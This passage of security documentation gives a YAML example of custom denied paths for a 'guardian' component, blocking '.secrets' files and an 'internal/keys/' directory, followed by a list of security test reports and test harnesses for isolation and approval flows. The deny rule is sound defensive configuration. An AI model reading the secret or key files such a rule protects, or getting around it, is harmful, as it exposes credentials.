### Custom Denied Paths

```yaml
guardian:
  deniedPaths:
    - '\\.secrets$'
    - 'internal/keys/'
```

---

## Security Verification Artifacts

Current verification artifacts for the claims in this document:

- `docs/security-testing-results/README.md`
- `docs/security-testing-results/SECURITY-CLAIM-MATRIX.md`
- `docs/security-testing-results/SECURITY-TEST-RESULTS-2026-03-12.md`
- `docs/security-testing-results/RELATED-TEST-SCRIPTS.md`

Primary executable harnesses:

- `scripts/test-security-verification.mjs`
- `scripts/test-brokered-isolation.mjs`
- `scripts/test-web-approvals.mjs`
- `scripts/test-cli-approvals.mjs`
